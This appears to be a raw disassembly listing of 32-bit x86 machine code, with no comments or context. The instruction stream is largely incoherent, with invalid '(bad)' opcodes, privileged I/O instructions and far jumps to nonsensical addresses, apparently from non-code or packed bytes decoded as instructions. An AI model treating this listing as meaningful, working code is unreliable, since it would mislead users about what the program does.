  41149a:	sub    ah,BYTE PTR [edx]
  41149c:	sti    
  41149d:	pop    eax
  41149e:	and    al,0x52
  4114a0:	pop    edi
  4114a1:	push   ecx
  4114a2:	daa    
  4114a3:	div    DWORD PTR [eax-0x67855cd2]
  4114a9:	jns    0x411439
  4114ab:	inc    esi
  4114ac:	pop    ds
  4114ad:	cwde   
  4114ae:	pusha  
  4114af:	jns    0x41147b
  4114b1:	cmp    DWORD PTR [esi+0x2d],0xffffff9f
  4114b5:	adc    ecx,DWORD PTR [edi+eax*4+0x34]
  4114b9:	int    0x98
  4114bb:	cmp    BYTE PTR [ebx+edi*1],dl
  4114be:	call   0xb3dad3bc
  4114c3:	push   0x5c471de
  4114c8:	pop    ebp
  4114c9:	or     DWORD PTR [ebp-0x53],0xffffffe3
  4114cd:	sbb    DWORD PTR [ebx],ebx
  4114cf:	add    al,0xd7
  4114d1:	shl    DWORD PTR [ebx-0x24ff414e],cl
  4114d7:	xchg   ebp,eax
  4114d8:	add    DWORD PTR [eax],0xc278d542
  4114de:	push   edx
  4114df:	aaa    
  4114e0:	neg    BYTE PTR [edx+0x2e]
  4114e3:	pusha  
  4114e4:	dec    edi
  4114e5:	mov    esp,0x240e9e9b
  4114ea:	nop
  4114eb:	xchg   ecx,eax
  4114ec:	push   0x85463ca6
  4114f1:	mov    eax,0x5fce531d
  4114f6:	adc    al,0xe
  4114f8:	pop    esi
  4114f9:	pop    es
  4114fa:	in     al,dx
  4114fb:	jmp    0x4114bf
  4114fd:	ins    DWORD PTR es:[edi],dx
  4114fe:	and    edi,esi
  411500:	mov    eax,0x3a190de4
  411505:	shr    esi,1
  411507:	mov    BYTE PTR [esp+edx*1+0x1a],ah
  41150b:	jne    0x41151b
  41150d:	lahf   
  41150e:	mov    esi,cs
  411510:	sbb    ebx,ebp
  411512:	(bad)  
  411513:	fnstenv [ebp+0x181b5810]
  411519:	dec    esp
  41151a:	xor    BYTE PTR [esi],dh
  41151c:	lods   al,BYTE PTR ds:[esi]
  41151d:	stos   BYTE PTR es:[edi],al
  41151e:	cmp    al,0xfb
  411520:	cmp    DWORD PTR [ecx+0x7e184e2f],esp
  411526:	cmp    eax,DWORD PTR [ebx+0xc]
  411529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41152a:	aaa    
  41152b:	das    
  41152c:	mov    al,0x30
  41152e:	pop    edx
  41152f:	pop    ss
  411530:	xor    al,0x80
  411532:	rcr    BYTE PTR [eax],0xad
  411535:	cmp    BYTE PTR [ebp+edx*2-0x3d8cecc3],dh
  41153c:	cmp    ebx,0x31fd7896
  411542:	outs   dx,DWORD PTR ds:[esi]
  411543:	repnz loopne 0x4114f5
  411546:	push   ss
  411547:	lock cld 
  411549:	test   DWORD PTR [ebx],ebp
  41154b:	fild   DWORD PTR [edi+0xd8c5d67]
  411551:	fst    DWORD PTR [edx+eax*1+0x5b]
  411555:	push   edi
  411556:	repz push 0xffffffef
  411559:	mov    bh,0xef
  41155b:	cmp    DWORD PTR [edx+0x4ef7e904],ebp
  411561:	fdivr  DWORD PTR [eax+0x5712e4a]
  411567:	out    dx,al
  411568:	outs   dx,DWORD PTR ds:[esi]
  411569:	push   edx
  41156a:	inc    edi
  41156b:	pop    ebp
  41156c:	or     esi,DWORD PTR [edx+ecx*8+0x6]
  411570:	test   eax,0x217ad78f
  411575:	mov    esi,0x4e28e41c
  41157a:	cmp    edx,DWORD PTR [edi-0x7e]
  41157d:	xchg   edi,eax
  41157e:	je     0x411563
  411580:	dec    eax
  411581:	push   0xffffffd1
  411583:	pop    ecx
  411584:	push   cs
  411585:	jo     0x4115d1
  411587:	ss loop 0x411580
  41158a:	jp     0x41156b
  41158c:	jle    0x411548
  41158e:	dec    esi
  41158f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411590:	inc    ebx
  411591:	dec    esi
  411592:	jmp    0x118c:0x92f699a
  411599:	stos   DWORD PTR es:[edi],eax
  41159a:	jp     0x4115b5
  41159c:	inc    edx
  41159d:	shl    edx,cl
  41159f:	jns    0x411570
  4115a1:	jmp    0x55f5257c
  4115a6:	pushf  
  4115a7:	pop    es
  4115a8:	mov    al,ds:0x492059cb
  4115ad:	lea    ebp,[ebp-0x13]
  4115b0:	ret    
  4115b1:	bound  esp,QWORD PTR [esi+0x27769dd1]
  4115b7:	xchg   ebp,eax
  4115b8:	mov    al,0x4a
  4115ba:	inc    edx
  4115bb:	lods   al,BYTE PTR ds:[esi]
  4115bc:	ret    0x4991
  4115bf:	call   0x9377f859
  4115c4:	and    BYTE PTR [esi-0x6b],bh
  4115c7:	fstp   QWORD PTR [ebx+0x1047175d]
  4115cd:	mov    WORD PTR [edx-0x481ddc45],gs
  4115d3:	(bad)  
  4115d4:	jmp    0x9882:0x8c3b9ceb
  4115db:	mov    edi,0x1b262dfe
  4115e0:	(bad)  
  4115e1:	and    DWORD PTR [esi-0x1c],ecx
  4115e4:	mov    dh,0xb7
  4115e6:	push   0xc88d3037
  4115eb:	(bad)  
  4115ec:	fsubr  DWORD PTR [esi+0x3b]
  4115ef:	in     al,dx
  4115f0:	mov    eax,0xef08eea4
  4115f5:	outs   dx,BYTE PTR ds:[esi]
  4115f6:	lahf   
  4115f7:	push   esp
  4115f8:	test   al,0x6f
  4115fa:	xchg   edx,eax
  4115fb:	test   dl,dh
  4115fd:	jp     0x4115ac
  4115ff:	out    dx,eax
  411600:	fisub  DWORD PTR ds:0x3509d60b
  411606:	dec    ebx
  411607:	adc    edx,DWORD PTR [eax+0x5]
  41160a:	aam    0x61
  41160c:	push   ebx
  41160d:	sbb    al,0x36
  41160f:	int3   
  411610:	cmc    
  411611:	cmp    eax,DWORD PTR [ebx-0x75]
  411614:	xor    al,0xac
  411616:	adc    BYTE PTR [ecx],cl
  411618:	xor    edi,edx
  41161a:	sbb    eax,0x6aab2405
  41161f:	push   ebp
  411620:	mov    WORD PTR [ecx],ds
  411622:	ds mov bl,0xcc
  411625:	jno    0x41165c
  411627:	lahf   
  411628:	jge    0x4116a8
  41162a:	mov    ds:0x29bf7a,al
  41162f:	mov    DWORD PTR [esi-0x1c],edi
  411632:	mov    dh,0xbc
  411634:	cmp    DWORD PTR [edx-0x13b4d0d7],eax
  41163a:	and    BYTE PTR [bp+si-0x65],ch
  41163e:	xor    eax,0x147ce43
  411643:	inc    ebp
  411644:	sub    ebx,DWORD PTR ds:0x94534f5c
  41164a:	pusha  
  41164b:	pop    edi
  41164c:	mov    ecx,DWORD PTR [esi-0x1b]
  41164f:	add    eax,0xe70373db
  411654:	add    BYTE PTR [ebx+0x39],ch
  411657:	and    ah,dh
  411659:	ds adc ah,ch
  41165c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41165d:	pusha  
  41165e:	call   0xb289:0x91668e56
  411665:	mov    ds:0xad8356fc,al
  41166a:	test   eax,0x97f9ef77
  41166f:	jle    0x41165f
  411671:	(bad)  
  411672:	and    al,0x7
  411674:	jbe    0x411602
  411676:	rcl    BYTE PTR [edi+esi*8],1
  411679:	cld    
  41167a:	loope  0x4116cf
  41167c:	ins    DWORD PTR es:[edi],dx
  41167d:	adc    al,0x34
  41167f:	mov    dl,BYTE PTR [eax+0x81f22a2]
  411685:	pop    esp
  411686:	xchg   esp,eax
  411687:	pop    esi
  411688:	out    0x8d,eax
  41168a:	fwait
  41168b:	pop    ds
  41168c:	daa    
  41168d:	cld    
  41168e:	inc    ebp
  41168f:	xor    eax,0xe6209e54
  411694:	int    0xfb
  411696:	sti    
  411697:	mov    ds:0x5feaf4d9,eax
  41169c:	lahf   
  41169d:	push   esi
  41169e:	ret    0xc8cc
  4116a1:	js     0x4116aa
  4116a3:	xchg   ecx,eax
  4116a4:	scas   eax,DWORD PTR es:[edi]
  4116a5:	cmp    BYTE PTR [eax],dl
  4116a7:	in     eax,0x7
  4116a9:	fwait
  4116aa:	ds xchg ebp,eax
  4116ac:	mov    eax,ds:0x1ddd6a33
  4116b1:	fild   DWORD PTR [edx+0x18]
  4116b4:	js     0x41164d
  4116b6:	push   cs
  4116b7:	xor    al,dh
  4116b9:	ins    BYTE PTR es:[edi],dx
  4116ba:	loop   0x411650
  4116bc:	inc    ebx
  4116bd:	sbb    al,0x97
  4116bf:	(bad)  
  4116c0:	pushf  
  4116c1:	lea    esp,[ebx-0x6e]
  4116c4:	mov    bl,0x95
  4116c6:	std    
  4116c7:	loop   0x4116f6
  4116c9:	and    al,0x6c
  4116cb:	jns    0x411707
  4116cd:	pop    edi
  4116ce:	pushf  
  4116cf:	call   0xa0fb:0xd871ccde
  4116d6:	sub    eax,0xe22adc46
  4116db:	popa   
  4116dc:	ror    bh,1
  4116de:	scas   eax,DWORD PTR es:[edi]
  4116df:	in     eax,0xfe
  4116e1:	ja     0x41172c
  4116e3:	pop    edi
  4116e4:	shl    DWORD PTR [ebp-0x758c5c45],1
  4116ea:	scas   al,BYTE PTR es:[edi]
  4116eb:	inc    ebp
  4116ec:	sbb    BYTE PTR [esi*2+0x49252d4d],dl
  4116f3:	mov    ds:0x588583bb,eax
  4116f8:	ret    0xaf37
  4116fb:	and    BYTE PTR [ebx+eiz*1],dh
  4116fe:	xchg   esi,eax
  4116ff:	les    ebp,FWORD PTR [esi+eax*1-0x2a]
  411703:	pop    es
  411704:	mov    dh,0x1c
  411706:	xor    al,0x2a
  411708:	ds push 0xfffffff3
  41170b:	outs   dx,DWORD PTR ds:[esi]
  41170c:	adc    DWORD PTR [eax+0x721c0e29],0x9e5425a8
  411716:	lahf   
  411717:	aas    
  411718:	(bad)
  41171c:	aam    0x11
  41171e:	jb     0x411714
  411720:	repz shl DWORD PTR [eax-0x63f739c9],cl
  411727:	bound  edi,QWORD PTR [ebx-0x54]
  41172a:	dec    ebp
  41172b:	jge    0x4116c7
  41172d:	push   ds
  41172e:	rcr    BYTE PTR [ecx-0x4d],cl
  411731:	pop    edx
  411732:	scas   al,BYTE PTR es:[edi]
  411733:	push   esp
  411734:	sub    eax,0xedb4d091
  411739:	dec    ebx
  41173a:	pushf  
  41173b:	mov    al,0xbf
  41173d:	cmp    eax,0xb184ab68
  411742:	sbb    al,0x64
  411744:	inc    esp
  411745:	pop    ecx
  411746:	or     DWORD PTR [ecx+0x64],esp
  411749:	sub    BYTE PTR [ebp+0x5e4c6204],ch
  41174f:	clc    
  411750:	fild   WORD PTR [esi]
  411752:	push   es
  411753:	add    DWORD PTR [eax],esp
  411755:	fwait
  411756:	sub    BYTE PTR [eax+edx*8+0x7de3f9d1],0x2e
  41175e:	jle    0x411768
  411760:	jbe    0x4117be
  411762:	jns    0x4117c1
  411764:	pop    esi
  411765:	add    eax,0xb9d62095
  41176a:	stos   BYTE PTR es:[edi],al
  41176b:	mov    ebx,0xdf73aa6b
  411770:	aad    0xf7
  411772:	mov    ecx,0x96cc605
  411777:	mov    bl,0x1
  411779:	mov    ebp,0x5da0a10b
  41177e:	push   ebp
  41177f:	fsubr  QWORD PTR [edx]
  411781:	push   ss
  411782:	stc    
  411783:	and    eax,0x3d0d90a3
  411788:	xchg   esi,eax
  411789:	cmp    esp,DWORD PTR [ebx+eax*2-0x53]
  41178d:	jmp    0x26ab:0x8f1a9b37
  411794:	nop
  411795:	out    0x79,eax
  411797:	cli    
  411798:	fsubr  QWORD PTR [ecx+edx*4+0x11]
  41179c:	jo     0x4117f9
  41179e:	inc    ecx
  41179f:	jge    0x6c33a714
  4117a5:	mov    ds:0x8d719f53,al
  4117aa:	xchg   DWORD PTR [edi+0x7aa57cc9],esp
  4117b0:	ds rol esp,1
  4117b3:	mov    bl,al
  4117b5:	xor    esi,eax
  4117b7:	pop    ss
  4117b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117b9:	push   edx
  4117ba:	les    edi,FWORD PTR [ecx-0x71459db5]
  4117c0:	std    
  4117c1:	sub    eax,0x1ef03a5f
  4117c6:	daa    
  4117c7:	sbb    ch,ch
  4117c9:	imul   BYTE PTR [esi+esi*4-0x110f2c7e]
  4117d0:	dec    esp
  4117d1:	dec    ebx
  4117d2:	jecxz  0x411842
  4117d4:	ins    DWORD PTR es:[edi],dx
  4117d5:	pop    ss
  4117d6:	clc    
  4117d7:	and    al,0x52
  4117d9:	retf   0x2552
  4117dc:	sub    ebp,DWORD PTR [edi-0x725743d7]
  4117e2:	xchg   esp,eax
  4117e3:	adc    eax,0xab27d9e3
  4117e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e9:	sbb    ebx,esp
  4117eb:	hlt    
  4117ec:	xor    DWORD PTR [ebp+0x1d744a5f],0xf3467bfd
  4117f6:	adc    eax,0xd4210b63
  4117fb:	cmp    ch,BYTE PTR [edi+eiz*8+0x46]
  4117ff:	mov    BYTE PTR [esi-0xb1e0f40],ch
  411805:	rol    DWORD PTR [edx+0x56],1
  411808:	popa   
  411809:	pop    ds
  41180a:	(bad)  
  41180b:	out    dx,al
  41180c:	inc    ebx
  41180d:	cmp    ebx,0x8066607c
  411813:	or     bh,al
  411815:	fwait
  411816:	scas   eax,DWORD PTR es:[edi]
  411817:	jne    0x4117e1
  411819:	(bad)  
  41181a:	leave  
  41181b:	js     0x4117fa
  41181d:	cmp    al,0xe1
  41181f:	or     ah,BYTE PTR [eax+0x40]
  411822:	xor    ah,BYTE PTR [esi-0x49]
  411825:	dec    esp
  411826:	dec    edx
  411827:	cwde   
  411828:	push   ebp
  411829:	(bad)  
  41182b:	mov    edx,DWORD PTR [ebx+edx*1]
  41182e:	idiv   al
  411830:	pop    esi
  411831:	inc    edi
  411832:	stos   DWORD PTR es:[edi],eax
  411833:	repnz or al,0xf
  411836:	jp     0x41183e
  411838:	jno    0x41181a
  41183a:	ss je  0x411835
  41183d:	push   edx
  41183e:	jl     0x4117d8
  411840:	pop    DWORD PTR [ecx]
  411842:	dec    eax
  411843:	mov    ch,0x20
  411845:	cmp    al,0xeb
  411847:	or     al,0x5d
  411849:	dec    ebp
  41184a:	shr    BYTE PTR [ebp+0x72b9ecea],1
  411850:	xchg   ebp,esp
  411852:	fdiv   DWORD PTR [edi-0x62]
  411855:	xchg   DWORD PTR [eax-0x2],edx
  411858:	xchg   ecx,eax
  411859:	and    eax,0x28931338
  41185e:	pop    eax
  41185f:	add    BYTE PTR ds:0x341b1c7,dh
  411865:	test   eax,0x5292547b
  41186a:	rcr    eax,1
  41186c:	ds sti 
  41186e:	and    DWORD PTR [eax+0x3a8ca159],ebx
  411874:	push   cs
  411875:	and    eax,0x4a5ab3bb
  41187a:	hlt    
  41187b:	jg     0x411815
  41187d:	fcom   QWORD PTR [eax]
  41187f:	adc    edx,DWORD PTR [ebp+0x4b99b591]
  411885:	xchg   ecx,eax
  411886:	fneni(8087 only) 
  411888:	cmp    BYTE PTR [ecx-0x59d09dec],cl
  41188e:	repz mov edi,0x5bb4d1d4
  411894:	xchg   BYTE PTR [esi-0xd],cl
  411897:	fild   QWORD PTR [ebx-0x47]
  41189a:	sub    eax,0x72aba0ae
  41189f:	jmp    0xf0ef2b8
  4118a4:	xchg   ebx,eax
  4118a5:	jno    0x4118fc
  4118a7:	sub    ah,dh
  4118a9:	jge    0x411848
  4118ab:	mov    ebp,0xfb988f31
  4118b0:	mov    esp,0x28b2ef8e
  4118b5:	pop    ss
  4118b6:	popf   
  4118b7:	gs cmp esp,ebp
  4118ba:	out    0x61,al
  4118bc:	sub    dl,BYTE PTR [ecx-0x7b]
  4118bf:	mov    dh,0x66
  4118c1:	jecxz  0x41190e
  4118c3:	cmp    bh,BYTE PTR [ebx+0x1957bcc]
  4118c9:	cwde   
  4118ca:	stos   DWORD PTR es:[edi],eax
  4118cb:	xor    BYTE PTR [edx],dh
  4118cd:	mov    dh,0x6a
  4118cf:	add    bl,BYTE PTR [edx+edx*2-0x5d93d968]
  4118d6:	inc    eax
  4118d7:	add    al,BYTE PTR [edx-0x6cb47708]
  4118dd:	add    cl,ch
  4118df:	mov    WORD PTR [ebx-0x1e],ds
  4118e2:	pop    edx
  4118e3:	jecxz  0x41193f
  4118e5:	push   ecx
  4118e6:	and    al,0xbf
  4118e8:	out    dx,al
  4118e9:	pop    esi
  4118ea:	dec    eax
  4118eb:	xchg   ebx,eax
  4118ec:	out    dx,eax
  4118ed:	je     0x41187e
  4118ef:	xor    DWORD PTR [ebx+0x9],esp
  4118f2:	inc    edx
  4118f3:	add    DWORD PTR [ecx+0x3c],edx
  4118f6:	xchg   edx,eax
  4118f7:	imul   eax,DWORD PTR [ebx+eiz*8],0xffffffaf
  4118fb:	xor    bl,BYTE PTR [ecx-0x5eb0631f]
  411901:	into   
  411902:	sub    bl,BYTE PTR [eax-0x5c]
  411905:	sbb    esp,ecx
  411907:	ins    BYTE PTR es:[edi],dx
  411908:	out    0x38,eax
  41190a:	scas   al,BYTE PTR es:[edi]
  41190b:	scas   eax,DWORD PTR es:[edi]
  41190c:	mov    ah,dl
  41190e:	in     eax,dx
  41190f:	push   0xc3848e29
  411914:	mov    ah,0x15
  411916:	xchg   esp,eax
  411917:	sbb    dl,BYTE PTR [ecx-0x6e67f896]
  41191d:	pop    eax
  41191e:	inc    edx
  41191f:	mov    ah,bh
  411921:	fs jge 0x41199f
  411924:	push   ebx
  411925:	push   0xffffff9f
  411927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411928:	add    eax,ebx
  41192a:	ret    0x2806
  41192d:	add    dl,BYTE PTR [eax+0x38]
  411930:	sti    
  411931:	icebp  
  411932:	int3   
  411933:	xchg   ebp,eax
  411934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411935:	push   esp
  411936:	xor    ecx,edx
  411938:	dec    edi
  411939:	outs   dx,BYTE PTR ds:[esi]
  41193a:	enter  0x197a,0xd5
  41193e:	shr    ebp,cl
  411940:	lahf   
  411941:	outs   dx,BYTE PTR ds:[esi]
  411942:	xchg   edi,eax
  411943:	jecxz  0x4119ba
  411945:	lds    ecx,FWORD PTR ds:0x483691f1
  41194b:	push   eax
  41194c:	and    DWORD PTR [ebx+0x5a],ecx
  41194f:	push   ds
  411950:	adc    eax,0xeeb5c7c8
  411955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411956:	jge    0x4118f3
  411958:	mov    ebx,0xe6b984c4
  41195d:	imul   ecx,DWORD PTR [ebp+0x8667b7e],0x8024ca5
  411967:	ret    0x70cf
  41196a:	imul   ebp,DWORD PTR fs:[edx-0x29],0x17dc7478
  411972:	xlat   BYTE PTR ds:[ebx]
  411973:	mov    ecx,0x654166b
  411978:	ret    0xb2ea
  41197b:	xchg   ebp,eax
  41197c:	call   0x3017:0xd2be95b9
  411983:	outs   dx,BYTE PTR ds:[esi]
  411984:	mov    edi,0x212c3f61
  411989:	imul   edx,DWORD PTR [ebx],0x54d6f5cc
  41198f:	push   0x24de68da
  411994:	mov    ecx,0xb955e4e3
  411999:	loopne 0x4119c9
  41199b:	xor    DWORD PTR [esi],ebx
  41199d:	mov    cl,0xc8
  41199f:	mov    DWORD PTR [ecx+0x6aa90fd1],edi
  4119a5:	stos   BYTE PTR es:[edi],al
  4119a6:	adc    al,0x94
  4119a8:	jmp    0x2729e61d
  4119ad:	nop
  4119ae:	in     al,0x9e
  4119b0:	mov    ch,0xf6
  4119b2:	pop    ecx
  4119b3:	cmp    edi,ecx
  4119b5:	aad    0xa2
  4119b7:	bnd jl 0x4119e5
  4119ba:	sar    DWORD PTR [esi+0x18],1
  4119bd:	pop    ebx
  4119be:	inc    esp
  4119bf:	int    0xa4
  4119c1:	popa   
  4119c2:	hlt    
  4119c3:	in     eax,0xb7
  4119c5:	push   ss
  4119c6:	sub    al,0x3f
  4119c8:	lods   al,BYTE PTR ds:[esi]
  4119c9:	jb     0x4119ab
  4119cb:	call   DWORD PTR [ecx+ecx*1]
  4119ce:	mov    cl,0xbc
  4119d0:	je     0x4119c5
  4119d2:	(bad)  [edi]
  4119d4:	mov    ah,0xcf
  4119d6:	and    DWORD PTR [ecx+ebp*1+0x5cce6452],edx
  4119dd:	mov    WORD PTR [edx+0x7efbd02f],cs
  4119e3:	mov    ch,0xef
  4119e5:	clc    
  4119e6:	xor    dh,ch
  4119e8:	jbe    0x4119a5
  4119ea:	(bad)  
  4119eb:	in     eax,dx
  4119ec:	les    edi,FWORD PTR [edx+0x7d]
  4119ef:	ins    DWORD PTR es:[edi],dx
  4119f0:	pop    edx
  4119f1:	dec    edx
  4119f2:	pop    esi
  4119f3:	pop    edi
  4119f4:	enter  0x232d,0x62
  4119f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119f9:	adc    eax,0x3b692af2
  4119fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119ff:	scas   eax,DWORD PTR es:[edi]
  411a00:	cli    
  411a01:	cmp    DWORD PTR [edi-0x6b],0xffffffd5
  411a05:	into   
  411a06:	cmc    
  411a07:	inc    ecx
  411a08:	push   edi
  411a09:	fcomp  DWORD PTR [ebx]
  411a0b:	xchg   dh,bh
  411a0d:	sbb    BYTE PTR [eax],al
  411a0f:	dec    edx
  411a10:	mov    bh,0x78
  411a12:	retf   0x358f
  411a15:	call   0xb358:0xb72465a5
  411a1c:	dec    esi
  411a1d:	mov    ds:0xf97fdde2,eax
  411a22:	pop    ds
  411a23:	call   0x69b9:0x66ef0f99
  411a2a:	xor    BYTE PTR [ebx+0x5b],dl
  411a2d:	mov    bh,0xad
  411a2f:	out    0xa2,eax
  411a31:	mov    al,ds:0x785068de
  411a36:	mov    dl,0x7f
  411a38:	adc    esi,edi
  411a3a:	mov    dl,BYTE PTR [eax]
  411a3c:	mov    WORD PTR [eax*1+0x7442d3ef],ss
  411a43:	out    dx,eax
  411a44:	fcmovu st,st(2)
  411a46:	adc    eax,0x5c05a27a
  411a4b:	mov    eax,ds:0xbe1a37f0
  411a50:	lahf   
  411a51:	xchg   edi,eax
  411a52:	loopne 0x411ab3
  411a54:	mov    edi,0x1736d490
  411a59:	xchg   ebp,eax
  411a5a:	pop    eax
  411a5b:	nop
  411a5c:	mov    cl,0x97
  411a5e:	adc    al,BYTE PTR [edx-0x86ab838]
  411a64:	mov    WORD PTR [ebp+0x64],?
  411a67:	inc    ecx
  411a68:	push   ecx
  411a69:	mov    cl,0x8a
  411a6b:	inc    edi
  411a6c:	lods   al,BYTE PTR ds:[esi]
  411a6d:	call   0xac4d:0xd1399492
  411a74:	lock ret 0x7dc9
  411a78:	fist   WORD PTR [edx]
  411a7a:	mov    fs,ecx
  411a7c:	sbb    al,0xf9
  411a7e:	dec    edi
  411a7f:	sbb    dl,BYTE PTR [edx]
  411a81:	sbb    edi,esp
  411a83:	add    al,0x4c
  411a85:	mov    bl,0x90
  411a87:	sub    ebx,DWORD PTR ds:0x88292085
  411a8d:	dec    edi
  411a8e:	loope  0x411af9
  411a90:	ja     0x411a46
  411a92:	cdq    
  411a93:	sub    eax,0x84f0e6d4
  411a98:	out    dx,al
  411a99:	adc    DWORD PTR [ebx-0x2879fd83],ebp
  411a9f:	mov    dl,0x1c
  411aa1:	jmp    0x411aba
  411aa3:	sbb    al,0x91
  411aa5:	lods   al,BYTE PTR ds:[esi]
  411aa6:	jecxz  0x411ad3
  411aa8:	(bad)
  411aab:	out    0xf4,al
  411aad:	sbb    eax,0x642dba51
  411ab2:	sub    al,BYTE PTR [edi-0x1b]
  411ab5:	lahf   
  411ab6:	jb     0x411aaa
  411ab8:	sahf   
  411ab9:	sbb    DWORD PTR cs:[ebx-0x31],edx
  411abd:	push   0x33
  411abf:	jl     0x411b23
  411ac1:	mov    ds:0x105def31,al
  411ac6:	les    eax,FWORD PTR [esi]
  411ac8:	pop    ds
  411ac9:	(bad)  
  411aca:	push   ds
  411acb:	and    esi,DWORD PTR [edx+0xe]
  411ace:	or     edx,DWORD PTR [edx+0x5b93b20a]
  411ad4:	stos   DWORD PTR es:[edi],eax
  411ad5:	or     cl,BYTE PTR fs:[esi]
  411ad8:	or     dl,BYTE PTR [ebx-0x22]
  411adb:	lahf   
  411adc:	pop    edx
  411add:	aaa    
  411ade:	into   
  411adf:	fbld   TBYTE PTR [edx+0xf9acd7f]
  411ae5:	out    0xf4,eax
  411ae7:	ja     0x411b43
  411ae9:	xchg   ebx,eax
  411aea:	jg     0x411a8e
  411aec:	into   
  411aed:	and    DWORD PTR [ebx-0x6],edx
  411af0:	sbb    DWORD PTR [eax],0x1be7e585
  411af6:	jp     0x411ad5
  411af8:	inc    edx
  411af9:	push   es
  411afa:	sub    BYTE PTR [edi+0x55],ch
  411afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411afe:	test   BYTE PTR [ecx+0x5b92ff46],dl
  411b04:	mov    esp,0x494108af
  411b09:	mov    dl,0x9b
  411b0b:	into   
  411b0c:	push   0xffffffa7
  411b0e:	inc    eax
  411b0f:	hlt    
  411b10:	stos   BYTE PTR es:[edi],al
  411b11:	ja     0x411b26
  411b13:	daa    
  411b14:	fld    DWORD PTR [eax+eax*4+0x679a7d8c]
  411b1b:	inc    edi
  411b1c:	icebp  
  411b1d:	cmp    ch,BYTE PTR [eax+eiz*2+0x6fb99913]
  411b24:	pop    eax
  411b25:	outs   dx,BYTE PTR ds:[esi]
  411b26:	jns    0x411b2f
  411b28:	es nop
  411b2a:	add    BYTE PTR [eax],ah
  411b2c:	scas   eax,DWORD PTR es:[edi]
  411b2d:	jmp    0x650c:0x134ae585
  411b34:	cmc    
  411b35:	call   0x409a9a32
  411b3a:	or     edi,DWORD PTR [ebx]
  411b3c:	or     eax,0x457af5de
  411b41:	imul   eax,esi,0xffffffe8
  411b44:	call   0xe4e6d711
  411b49:	add    al,0xc7
  411b4b:	cmp    DWORD PTR [ecx-0x5cde3733],edx
  411b51:	rcr    BYTE PTR [edi-0x25810ad6],cl
  411b57:	loopne 0x411b27
  411b59:	or     al,0x96
  411b5b:	jle    0x411b3e
  411b5d:	inc    eax
  411b5e:	sub    BYTE PTR [eax+ebx*2],dh
  411b61:	mov    ebp,DWORD PTR [ebp-0x1]
  411b64:	clc    
  411b65:	retf   
  411b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b67:	sar    DWORD PTR [esp+eax*8-0x29cb6324],0xec
  411b6f:	ror    DWORD PTR [eax],cl
  411b71:	ins    BYTE PTR es:[edi],dx
  411b72:	and    eax,0x6bc4ea04
  411b77:	nop
  411b78:	push   edi
  411b79:	push   ecx
  411b7a:	ins    DWORD PTR es:[edi],dx
  411b7b:	sbb    DWORD PTR [edi+0x6c2fcf2],0x38f64db3
  411b85:	ret    0x15bf
  411b88:	ror    BYTE PTR [edi],1
  411b8a:	bound  edi,QWORD PTR [eax+0x1bffef16]
  411b90:	adc    al,0xfd
  411b92:	and    eax,0xd5abe3fb
  411b97:	(bad)  
  411b99:	pushf  
  411b9a:	or     cl,BYTE PTR [ebx]
  411b9c:	sbb    eax,0xa3ceb2ca
  411ba1:	(bad)  
  411ba2:	jns    0x411c10
  411ba4:	fistp  DWORD PTR [edx]
  411ba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba7:	sti    
  411ba8:	call   0x1550:0x5ce629ab
  411baf:	in     al,dx
  411bb0:	and    BYTE PTR [eax+0x7b],bl
  411bb3:	out    dx,al
  411bb4:	retf   
  411bb5:	mov    ebp,0x5cafa1e9
  411bba:	push   es
  411bbb:	and    dl,BYTE PTR [eax+0x5a]
  411bbe:	jnp    0x411bac
  411bc0:	icebp  
  411bc1:	pop    ds
  411bc2:	mov    edi,0xb800891
  411bc7:	imul   ax,dx,0x938a
  411bcc:	pop    ss
  411bcd:	push   esi
  411bce:	push   esi
  411bcf:	inc    ebx
  411bd0:	cmp    bl,dh
  411bd2:	fwait
  411bd3:	enter  0xc297,0xde
  411bd7:	mov    eax,ds:0xcffe7816
  411bdc:	clc    
  411bdd:	(bad)  
  411bde:	out    0x3f,eax
  411be0:	cld    
  411be1:	mov    esp,DWORD PTR [ebx+esi*4]
  411be4:	jmp    0xde59b242
  411be9:	mov    ah,0xe
  411beb:	jge    0x411bd5
  411bed:	mov    al,BYTE PTR [ebp+0x27]
  411bf0:	(bad)  
  411bf1:	out    0x69,eax
  411bf3:	sbb    BYTE PTR ds:0xd3336754,cl
  411bf9:	and    eax,0x7bbeb512
  411bfe:	fcom   DWORD PTR [ebp+ecx*4+0x2ecf8718]
  411c05:	adc    edi,edx
  411c07:	mov    edi,0xcc90f746
  411c0c:	sbb    al,0x27
  411c0e:	popf   
  411c0f:	iret   
  411c10:	rcl    DWORD PTR [edi],0x72
  411c13:	sahf   
  411c14:	mov    eax,ds:0xb1f51787
  411c19:	addr16 aam 0x51
  411c1c:	imul   ebx,DWORD PTR [ecx],0xa468b531
  411c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c23:	inc    ebx
  411c24:	jecxz  0x411bf4
  411c26:	(bad)  
  411c27:	call   0x52ea:0x7ebf20b6
  411c2e:	popf   
  411c2f:	jae    0x411c97
  411c31:	hlt    
  411c32:	push   es
  411c33:	aad    0x1c
  411c35:	xor    BYTE PTR [edx+0x5b535d97],bh
  411c3b:	jo     0x411c1a
  411c3d:	ret    
  411c3e:	jo     0x411c55
  411c40:	push   eax
  411c41:	sti    
  411c42:	not    BYTE PTR [esi+0x49]
  411c45:	xchg   ecx,eax
  411c46:	adc    dh,BYTE PTR [eax]
  411c48:	pop    eax
  411c49:	cmc    
  411c4a:	out    0x44,eax
  411c4c:	mov    edi,0xa3529c11
  411c51:	pop    esp
  411c52:	pop    ss
  411c53:	dec    ecx
  411c54:	mov    ah,0x90
  411c56:	xchg   BYTE PTR [edx-0x50],ch
  411c59:	inc    DWORD PTR [edi+0x69]
  411c5c:	pop    es
